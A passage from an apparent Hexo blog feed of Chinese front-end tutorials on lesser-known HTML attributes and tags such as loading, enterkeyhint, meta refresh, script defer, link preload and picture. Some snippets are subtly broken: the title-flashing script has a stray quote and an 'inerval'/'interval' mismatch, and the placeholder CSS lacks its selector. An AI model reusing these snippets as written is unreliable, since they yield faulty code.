加载图像所需的时间不会改变，但其“解码”的方式由解码属性决定。<code>decoding</code> 属性可以控制是否允许浏览器尝试异步加载图像。异步加载对 <img> 元素很有用，对屏幕外的图像对象可能会更有用。</p><h2 id="5-loading"><a href="#5-loading" class="headerlink" title="5. loading"></a>5. loading</h2><p>loading 属性不仅可以用在 <code>&lt;img&gt;</code> 元素上，也可以用在 <code>&lt;iframe&gt;</code> 元素上，用于触发<code>&lt;iframe&gt;</code>网页的懒加载：<br />该属性可以取以下三个值：<br />●<code>auto</code>：浏览器的默认行为，与不使用 loading 属性效果相同。<br />●<code>lazy</code>：懒加载，即将滚动进入视口时开始加载。<br />●<code>eager</code>：立即加载资源 ，无论在页面上的位置如何。</p><p>需要注意，如果<code>&lt;iframe&gt;</code>是隐藏的，则<code>loading</code>属性无效，将会立即加载。</p><h2 id="6-form"><a href="#6-form" class="headerlink" title="6. form"></a>6. form</h2><p>在大多数情况下，我们会将表单输入和控件嵌套在 <code>&lt;form&gt;</code> 元素中。 当然，我们也可以将表单输入放在任何位置，并将其与所属的 <code>&lt;form&gt;</code> 元素相关联。只需要使用 <code>form</code> 属性来指定其所属的<code>form</code>表单即可：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;form id=<span class="string">&quot;myForm&quot;</span> action=<span class="string">&quot;&quot;</span>&gt;</span><br><span class="line">  &lt;input id=&quot;name&quot;&gt;</span><br><span class="line">  &lt;button type=&quot;submit&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;input type=&quot;email&quot; form=&quot;myForm&quot;&gt;</span><br></pre></td></tr></table></figure><p><br />可以看到，表单外部的电子邮件<code>&lt;input&gt;</code> 的 <code>form</code> 属性设置为 <code>myForm</code>，该属性与表单的 <code>id</code> 相同。 可以使用此属性和表单的 <code>id</code> 将表单控件（包括提交按钮）与任何表单相关联。</p><h2 id="7-imagesizes-和-imagesrcset"><a href="#7-imagesizes-和-imagesrcset" class="headerlink" title="7. imagesizes 和 imagesrcset"></a>7. imagesizes 和 imagesrcset</h2><p><code>imagesizes</code> 和 <code>imagesrcset</code>属性用来预加载响应式图像，可以与 <code>rel=preload</code> 以及 <code>&lt;link&gt;</code> 元素一起定义，如下所示：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel=<span class="string">&quot;preload&quot;</span></span><br><span class="line">      <span class="keyword">as</span>=<span class="string">&quot;image&quot;</span></span><br><span class="line">      imagesrcset=<span class="string">&quot;images/example-480.png 480w,</span></span><br><span class="line"><span class="string">                   images/example-800.png 800w,</span></span><br><span class="line"><span class="string">                   images/example.png 2000w&quot;</span></span><br><span class="line">      imagesizes=<span class="string">&quot;(max-width: 600px) 480px,</span></span><br><span class="line"><span class="string">                  (max-width: 1000px) 800px,</span></span><br><span class="line"><span class="string">                  1000px&quot;</span></span><br><span class="line">      src=<span class="string">&quot;images/example.png&quot;</span></span><br><span class="line">      alt=<span class="string">&quot;Example Image&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p><br />这里使用 <code>rel=preload</code> 会通知浏览器希望指定的资源优先加载，因此它们不会被脚本和样式表之类的东西阻塞。 as 属性指定所请求内容的类型。</p><p>可以使用 <code>href</code> 属性以及 <code>preload</code> 和 <code>as</code> 来预加载常规图像。 还可以使用 <code>imagesrcset</code> 和 <code>imagesizes</code> 属性来预加载正确的图像，具体取决于视口的大小或在 <code>imagesizes</code> 属性中指定的其他媒体功能。</p><h2 id="8-enterkeyhint"><a href="#8-enterkeyhint" class="headerlink" title="8. enterkeyhint"></a>8. enterkeyhint</h2><p>当我们在手机键盘上按下回车键<code>（enter）</code>时，在不同的场景下可能执行的操作有所不同，比如换行、发送消息、执行搜索、确认等等。这些操作可以通过 <code>enterkeyhint</code> 属性来实现。</p><p><code>enterkeyhint</code> 属性是一个全局属性，可应用于将 <code>contenteditable</code> 设置为 <code>true</code> 的表单控件或元素。 它的用法如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input enterkeyhint=<span class="string">&quot;values&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p><br />它的属性值有以下情况：<br />●<strong>done：</strong>完成并关闭输入法编辑器。<br />●<strong>enter：</strong>换行。<br />●<strong>go：</strong>输入完并继续下一个表单。<br />●<strong>search：</strong>输入后搜索内容。<br />●<strong>send：</strong>发送消息。<br />●<strong>next：</strong>将把用户带到下一个接受文本的字段。<br />●<strong>previous：</strong>将用户带到将接受文本的上一个字段。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Next</span>：&lt;input type=<span class="string">&quot;text&quot;</span> enterkeyhint=<span class="string">&quot;next&quot;</span>&gt;</span><br><span class="line"><span class="title class_">Done</span>: &lt;input type=&quot;text&quot; enterkeyhint=&quot;done&quot;&gt;</span><br><span class="line">  Go: &lt;input type=&quot;text&quot; enterkeyhint=&quot;go&quot;&gt;</span><br></pre></td></tr></table></figure><p><br />在手机键盘中进行输入时，可以看到键盘的 enter 键显示不同的操作：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1661094693758-28388fe3-5bdf-48ed-ad15-894335b898d2.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1661094693758-28388fe3-5bdf-48ed-ad15-894335b898d2.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1661094714387-5abacd5a-d353-452e-9068-67746fa8bf2a.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1661094714387-5abacd5a-d353-452e-9068-67746fa8bf2a.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> html </category>
          
      </categories>
      
      
        <tags>
            
            <tag> html </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>你不知道的HTML</title>
      <link href="/2023/07/04/frontend/html/ni-bu-zhi-dao-de-html/"/>
      <url>/2023/07/04/frontend/html/ni-bu-zhi-dao-de-html/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><h2 id="1-input-标签：输入验证"><a href="#1-input-标签：输入验证" class="headerlink" title="1. input 标签：输入验证"></a>1. input 标签：输入验证</h2><p>我们通常会使用 JavaScript 来校验表单，比如：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">validateForm</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> inputText = <span class="variable language_">document</span>.<span class="property">forms</span>[<span class="string">&quot;form-name&quot;</span>][<span class="string">&quot;input-name&quot;</span>].<span class="property">value</span>;</span><br><span class="line">  <span class="keyword">if</span> (!inputText) &#123;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br />以上是使用原生 JavaScript 实现的，现在很多项目都是使用 React、Vue 等框架来实现，表单校验可能稍微简单一些，这里不在多说，不是重点~</p><p>下面来看看 HTML 提供的原生检验方式：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/png/300943/1688455373284-a16ba8d0-c16f-4e4b-b86e-1aa1bdf8939f.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/png/300943/1688455373284-a16ba8d0-c16f-4e4b-b86e-1aa1bdf8939f.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"></p><h2 id="2-meta-标签：自动刷新-x2F-跳转"><a href="#2-meta-标签：自动刷新-x2F-跳转" class="headerlink" title="2. meta 标签：自动刷新&#x2F;跳转"></a>2. meta 标签：自动刷新&#x2F;跳转</h2><p>假设要实现一个类似 PPT 自动播放的效果，你可能会想到使用 JavaScript 定时器控制页面跳转来实现。但其实有更加简洁的实现方法，比如通过 meta 标签来实现：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=<span class="string">&quot;Refresh&quot;</span> content=<span class="string">&quot;5; URL=page2.html&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p><br />上面的代码会在 5s 之后自动跳转到同域下的 page2.html 页面。要实现 PPT 自动播放的功能，只需要在每个页面的 meta 标签内设置好下一个页面的地址即可。</p><p>另一种场景，比如每隔一分钟就需要刷新页面的大屏幕监控，也可以通过 meta 标签来实现，只需去掉后面的 URL 即可：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=<span class="string">&quot;Refresh&quot;</span> content=<span class="string">&quot;60&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p>可以看到，这样做又方便又快捷，那为什么这种用法比较少见呢？</p><p>一方面是因为不少人对 meta 标签用法缺乏深入了解，另一方面也是因为在使用它的时候，刷新和跳转操作是不可取消的，所以对刷新时间间隔或者需要手动取消的，还是推荐使用 JavaScript 定时器来实现。但是，如果只是想实现页面的定时刷新或跳转（比如某些页面缺乏访问权限，在 x 秒后跳回首页这样的场景）建议可以实践下 meta 标签的用法。</p><h2 id="3-title-标签：消息提醒"><a href="#3-title-标签：消息提醒" class="headerlink" title="3. title 标签：消息提醒"></a>3. title 标签：消息提醒</h2><p>消息提醒功能实现比较困难，HTML5 标准发布之前，浏览器没有开放图标闪烁、弹出系统消息之类的接口，只能借助一些 Hack 的手段，比如修改 title 标签来达到类似的效果（HTML5 下可使用 Web Notifications API 弹出系统消息）。</p><p>下面代码中，通过定时修改 title 标签内容，模拟了类似消息提醒的闪烁效果：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">‘<span class="keyword">let</span> msgNum = <span class="number">1</span> <span class="comment">// 消息条数</span></span><br><span class="line"><span class="keyword">let</span> cnt = <span class="number">0</span> <span class="comment">// 计数器</span></span><br><span class="line"><span class="keyword">const</span> inerval = <span class="built_in">setInterval</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  cnt = (cnt + <span class="number">1</span>) % <span class="number">2</span></span><br><span class="line">  <span class="keyword">if</span>(msgNum===<span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">// 通过DOM修改title</span></span><br><span class="line">    <span class="variable language_">document</span>.<span class="property">title</span> += <span class="string">`聊天页面`</span></span><br><span class="line">    <span class="built_in">clearInterval</span>(interval)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">const</span> prefix = cnt % <span class="number">2</span> ? <span class="string">`新消息(<span class="subst">$&#123;msgNum&#125;</span>)`</span> : <span class="string">&#x27;&#x27;</span></span><br><span class="line">  <span class="variable language_">document</span>.<span class="property">title</span> = <span class="string">`<span class="subst">$&#123;prefix&#125;</span>聊天页面`</span></span><br><span class="line">&#125;, <span class="number">1000</span>)</span><br></pre></td></tr></table></figure><p>实现效果如下图所示，可以看到标签名称上有提示文字在闪烁。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/gif/1500604/1613308840781-c83b34c6-d7f4-4a25-b995-c9f8b51561d1.gif" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/gif/1500604/1613308840781-c83b34c6-d7f4-4a25-b995-c9f8b51561d1.gif" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>通过模拟消息闪烁，可以让用户在浏览其他页面的时候，及时得知服务端返回的消息。</p><p>定时修改 title 标签内容，除了用来实现闪烁效果之外，还可以制作其他动画效果，比如文字滚动，但需要注意浏览器会对 title 标签文本进行去空格操作。</p><p>动态修改 title 标签的用途不仅在于消息提醒，还可以将一些关键信息显示到标签上（比如下载时的进度、当前操作步骤），从而提升用户体验。</p><h2 id="4-script-标签：调整加载顺序提升渲染速度"><a href="#4-script-标签：调整加载顺序提升渲染速度" class="headerlink" title="4. script 标签：调整加载顺序提升渲染速度"></a>4. script 标签：调整加载顺序提升渲染速度</h2><p>由于浏览器的底层运行机制，渲染引擎在解析 HTML 时，若遇到 script 标签引用文件，则会暂停解析过程，同时通知网络线程加载文件，文件加载后会切换至 JavaScript 引擎来执行对应代码，代码执行完成之后切换至渲染引擎继续渲染页面。</p><p>在这一过程中可以看到，页面渲染过程中包含了请求文件以及执行文件的时间，但页面的首次渲染可能并不依赖这些文件，这些请求和执行文件的动作反而延长了用户看到页面的时间，从而降低了用户体验。</p><p>为了减少这些时间损耗，可以借助 script 标签的 3 个属性来实现。<br />●<strong>async 属性：</strong>立即请求文件，但不阻塞渲染引擎，而是文件加载完毕后阻塞渲染引擎并立即执行文件内容。<br />●<strong>defer 属性：</strong>立即请求文件，但不阻塞渲染引擎，等到解析完 HTML 之后再执行文件内容。<br />●<strong>HTML5 标准 type 属性：</strong>对应值为“module”。让浏览器按照 ECMA Script 6 标准将文件当作模块进行解析，默认阻塞效果同 defer，也可以配合 async 在请求完成后立即执行。</p><p>具体效果可以参看下图：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1613309543297-171b78d3-916a-4a06-a451-a8a83204db1f.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1613309543297-171b78d3-916a-4a06-a451-a8a83204db1f.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>其中，绿色的线表示执行解析 HTML ，蓝色的线表示请求文件，红色的线表示执行文件。</p><p>从图中可以得知，采用 3 种属性都能减少请求文件引起的阻塞时间，只有 defer 属性以及 type&#x3D;”module” 情况下能保证渲染引擎的优先执行，从而减少执行文件内容消耗的时间，让用户更快地看见页面（即使这些页面内容可能并没有完全地显示）。</p><p>注意，当渲染引擎解析 HTML 遇到 script 标签引入文件时，会立即进行一次渲染。所以这也就是为什么构建工具会把编译好的引用 JavaScript 代码的 script 标签放入到 body 标签底部，因为当渲染引擎执行到 body 底部时会先将已解析的内容渲染出来，然后再去请求相应的 JavaScript 文件。如果是内联脚本（即不通过 src 属性引用外部脚本文件直接在 HTML 编写 JavaScript 代码的形式），渲染引擎则不会渲染。</p><h2 id="5-link-标签：通过预处理提升渲染速度"><a href="#5-link-标签：通过预处理提升渲染速度" class="headerlink" title="5. link 标签：通过预处理提升渲染速度"></a>5. link 标签：通过预处理提升渲染速度</h2><p>在对大型单页应用进行性能优化时，也许会用到按需懒加载的方式，来加载对应的模块，但如果能合理利用 link 标签的 rel 属性值来进行预加载，就能进一步提升渲染速度。<br />●<strong>dns-prefetch</strong>：当 link 标签的 rel 属性值为“dns-prefetch”时，浏览器会对某个域名预先进行 DNS 解析并缓存。这样，当浏览器在请求同域名资源的时候，能省去从域名查询 IP 的过程，从而减少时间损耗。下图是淘宝网设置的 DNS 预解析。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1613309842478-af0ddc54-4a48-4fd6-a432-6bf1dcd85753.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1613309842478-af0ddc54-4a48-4fd6-a432-6bf1dcd85753.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>●<strong>preconnect</strong>：让浏览器在一个 HTTP 请求正式发给服务器前预先执行一些操作，这包括 DNS 解析、TLS 协商、TCP 握手，通过消除往返延迟来为用户节省时间。<br />●<strong>prefetch&#x2F;preload：</strong>两个值都是让浏览器预先下载并缓存某个资源，但不同的是，prefetch 可能会在浏览器忙时被忽略，而 preload 则是一定会被预先下载。<br />●<strong>prerender：</strong>浏览器不仅会加载资源，还会解析执行页面，进行预渲染。</p><p>这几个属性值恰好反映了浏览器获取资源文件的过程，下面是流程图：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1613310019182-bfacee7c-7bfc-44c9-a79b-2ed431905f7d.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1613310019182-bfacee7c-7bfc-44c9-a79b-2ed431905f7d.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><h2 id="6-link-标签：减少重复"><a href="#6-link-标签：减少重复" class="headerlink" title="6. link 标签：减少重复"></a>6. link 标签：减少重复</h2><p>有时候为了用户访问方便或者出于历史原因，对于同一个页面会有多个网址，又或者存在某些重定向页面，比如：<br />● <a href="https://baidu.com/a.html">https://baidu.com/a.html</a><br />● <a href="https://baidu.com/detail?id=%22abcd">https://baidu.com/detail?id=&quot;abcd</a>“</p><p>那么在这些页面中可以这样设置：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;link href=<span class="string">&quot;https://baidu.com/a.html&quot;</span> rel=<span class="string">&quot;canonical&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p>这样可以让搜索引擎避免花费时间抓取重复网页。不过需要注意的是，它还有个限制条件，那就是指向的网站不允许跨域。</p><p>当然，要合并网址还有其他的方式，比如使用站点地图，或者在 HTTP 请求响应头部添加 rel&#x3D;”canonical”。</p><h2 id="7-pre-标签：预格式化文本"><a href="#7-pre-标签：预格式化文本" class="headerlink" title="7. pre 标签：预格式化文本"></a>7. pre 标签：预格式化文本</h2><p>pre 元素可定义预格式化的文本。被包围在 pre 元素中的文本通常会保留空格和换行符。被 pre 标签包裹的文本会呈现为等宽字体。pre 标签的一个常见应用就是用来展示源代码。</p><p>pre 标签放入以下内容：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;pre&gt;</span><br><span class="line">  &amp;lt;html&amp;gt; &amp;lt;head&amp;gt; &amp;lt;script type=&amp;quot;text/javascript&amp;quot;</span><br><span class="line">  src=&amp;quot;loadxmldoc.<span class="property">js</span>&amp;quot;&amp;gt; &amp;lt;<span class="regexp">/script&amp;gt; &amp;lt;/</span>head&amp;gt; &amp;lt;body&amp;gt;</span><br><span class="line">  &amp;lt;<span class="regexp">/body&amp;gt; &amp;lt;/</span>html&amp;gt;</span><br><span class="line">&lt;/pre&gt;</span><br></pre></td></tr></table></figure><p><br />最终显示效果如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;loadxmldoc.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h2 id="8-figure-标签：标记图片"><a href="#8-figure-标签：标记图片" class="headerlink" title="8. figure 标签：标记图片"></a>8. figure 标签：标记图片</h2><p><code>&lt;figure&gt;</code>标签可以用于标记图片，其可以包含一个<code>&lt;figcaption&gt;</code>元素，用来描述图片：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;figure&gt;</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://t7.baidu.com/it/u=2604797219,1573897854&amp;fm=193&amp;f=GIF&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;Swat Kats&quot;</span> <span class="attr">style</span>=<span class="string">&quot;width:500px&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">figcaption</span>&gt;</span>风景图<span class="tag">&lt;/<span class="name">figcaption</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">figure</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1638803996296-15301331-fd73-4f75-9fcd-0ee2e7b63146.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1638803996296-15301331-fd73-4f75-9fcd-0ee2e7b63146.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><h2 id="9-picture-标签：响应式图像"><a href="#9-picture-标签：响应式图像" class="headerlink" title="9. picture 标签：响应式图像"></a>9. picture 标签：响应式图像</h2><p><code>picture</code>标签可以根据屏幕匹配的不同尺寸显示不同图片，如果没有匹配到或浏览器不支持 <code>picture</code> 属性则使用 img 元素：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;picture&gt;</span><br><span class="line">   &lt;source media=&quot;(min-width: 968px)&quot; srcset=&quot;large_img.jpg&quot;&gt;</span><br><span class="line">   &lt;source media=&quot;(min-width: 360px)&quot; srcset=&quot;small_img.jpg&quot;&gt;</span><br><span class="line">   &lt;img src=&quot;default_img.jpg&quot; alt=&quot;avatar&quot;&gt;</span><br><span class="line">&lt;/picture&gt;</span><br></pre></td></tr></table></figure><p><br />该标签一般用于响应式元素，可以让图片资源的调整更加灵活。如果浏览器不支持该属性也会显示<img> 元素的的图片。</p><h2 id="10-oncontextmenu-属性：禁用右键"><a href="#10-oncontextmenu-属性：禁用右键" class="headerlink" title="10. oncontextmenu 属性：禁用右键"></a>10. oncontextmenu 属性：禁用右键</h2><p>当我们给某个元素设置<code>oncontextmenu</code>属性时，就会禁用右键点击。如果给 body 元素设置这个属性，整个页面就会被禁用右键点击：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;p oncontextmenu=<span class="string">&quot;return false&quot;</span>&gt;<span class="title class_">Hello</span>&lt;/p&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">body</span> <span class="attr">oncontextmenu</span>=<span class="string">&quot;return false&quot;</span>&gt;</span>....<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h2 id="11-input-标签：颜色选择器"><a href="#11-input-标签：颜色选择器" class="headerlink" title="11. input 标签：颜色选择器"></a>11. input 标签：颜色选择器</h2><p>input 标签是支持很多类型的元素，我们可以使将 input 定义成一个颜色选择器：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=<span class="string">&quot;color&quot;</span> id=<span class="string">&quot;color-picker&quot;</span>  name=<span class="string">&quot;color-picker&quot;</span> value=<span class="string">&quot;#e66465&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p>可以通过 value 给颜色选择器设置初始值，也可以通过 value 属性获取颜色选择器的颜色。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1638806448244-3862e780-cc84-412e-b342-81a368ba95ac.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1638806448244-3862e780-cc84-412e-b342-81a368ba95ac.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><h2 id="12-base-标签：在新标签页打开"><a href="#12-base-标签：在新标签页打开" class="headerlink" title="12. base 标签：在新标签页打开"></a>12. base 标签：在新标签页打开</h2><p>我们可以将 base 元素的 target 属性设置为_black，这样当用户单击链接时，它始终会在新选项卡中打开。如果想避免用户无意中离开某个页面，这样做会很有用。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;head&gt;</span><br><span class="line">   <span class="language-xml"><span class="tag">&lt;<span class="name">base</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.baidu.com/&quot;</span>&gt;</span>百度一下<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>**13. placeholder 样式<br>可以使用 placeholder 属性设置占位符文本：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=<span class="string">&quot;text&quot;</span> placeholder=<span class="string">&quot;你的名字&quot;</span> /&gt;</span><br></pre></td></tr></table></figure><p>可以使用::placeholder CSS 选择器更改占位符文本的样式：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">  <span class="attr">color</span>: #<span class="number">210065</span>;</span><br><span class="line">  <span class="attr">opacity</span>: <span class="number">0.7</span>;</span><br><span class="line">  font-<span class="attr">size</span>: 16px;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" 